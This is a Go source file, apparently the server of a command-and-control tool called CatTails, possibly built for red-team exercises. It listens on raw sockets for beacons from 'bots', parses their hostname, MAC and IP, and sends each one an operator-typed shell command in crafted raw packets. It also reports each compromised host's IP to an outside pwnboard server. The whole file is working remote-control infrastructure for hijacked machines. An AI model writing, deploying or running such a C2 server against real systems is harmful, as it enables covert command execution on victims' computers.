package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strings"

	"github.com/google/gopacket"
	"github.com/oneNutW0nder/CatTails/cattails"
	"golang.org/x/sys/unix"
)

// Global to store staged command
var stagedCmd string

// Host defines values for a callback from a bot
type Host struct {
	Hostname string
	Mac      net.HardwareAddr
	IP       net.IP
}

// PwnBoard is used for updating pwnboard
type PwnBoard struct {
	IPs  string `json:"ips"`
	Type string `json:"type"`
}

// sendCommand takes
func sendCommand(iface *net.Interface, src net.IP, dstMAC net.HardwareAddr, listen chan Host) {

	// Forever loop to respond to bots
	for {
		// Block on reading from channel
		bot := <-listen
		// Check if there is a command to run
		if stagedCmd != "" {
			// Make a socket for sending
			fd := cattails.NewSocket()
			// Create packet
			packet := cattails.CreatePacket(iface, src, bot.IP, dstMAC, cattails.CreateCommand(stagedCmd))
			// YEET
			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)

			fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
			// Close the socket
			unix.Close(fd)
			go updatepwnBoard(bot)
		} else {
			go updatepwnBoard(bot)
		}
	}
}

// ProcessPacket TODO:
func serverProcessPacket(packet gopacket.Packet, listen chan Host) {

	// Get data from packet
	data := string(packet.ApplicationLayer().Payload())
	payload := strings.Split(data, " ")

	// Parse the values from the data
	mac, err := net.ParseMAC(payload[2])
	if err != nil {
		fmt.Println("[-] ERROR PARSING MAC:", err)
		return
	}

	// New Host struct for shipping info to sendCommand()
	newHost := Host{
		Hostname: payload[1],
		Mac:      mac,
		IP:       net.ParseIP(payload[3]),
	}

	// fmt.Println("[+] Recieved From:", newHost.Hostname, "(", newHost.IP, ")")
	// Write host to channel
	listen <- newHost
}

// Simple CLI to update the "stagedCmd" value
func cli() {
	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print("CatTails> ")
		stagedCmd, _ = reader.ReadString('\n')
		// Trim the bullshit newlines
		stagedCmd = strings.Trim(stagedCmd, "\n")
		fmt.Println("[+] Staged CMD:", stagedCmd)
	}
}

// Update pwnboard
func updatepwnBoard(bot Host) {
	url := "http://pwnboard.win/generic"

	// Create the struct
	data := PwnBoard{
		IPs:  bot.IP.String(),
		Type: "CatTails",
	}

	// Marshal the data
	sendit, err := json.Marshal(data)
	if err != nil {
		fmt.Println("\n[-] ERROR SENDING POST:", err)
	}

	// Send the post to pwnboard
	_, err = http.Post(url, "application/json", bytes.NewBuffer(sendit))
	if err != nil {
		fmt.Println("[-] ERROR SENDING POST:", err)
	}
}

func main() {

	// Create a BPF vm for filtering
	vm := cattails.CreateBPFVM(cattails.FilterRaw)

	// Create a socket for reading
	readfd := cattails.NewSocket()
	defer unix.Close(readfd)

	fmt.Println("[+] Created sockets")

	// Make channel buffer by 5
	listen := make(chan Host, 5)

	// Iface and src ip for the sendcommand func to use
	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
	fmt.Println("[+] Interface:", iface.Name)

	dstMAC, err := cattails.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] DST MAC:", dstMAC.String())

	// Spawn routine to listen for responses
	fmt.Println("[+] Starting go routine...")
	go sendCommand(iface, src, dstMAC, listen)

	// Start CLI
	go cli()

	// This needs to be on main thread
	for {
		// packet := cattails.ServerReadPacket(readfd, vm)
		packet := cattails.ServerReadPacket(readfd, vm)
		// Yeet over to processing function
		if packet != nil {
			go serverProcessPacket(packet, listen)
		}
	}
}
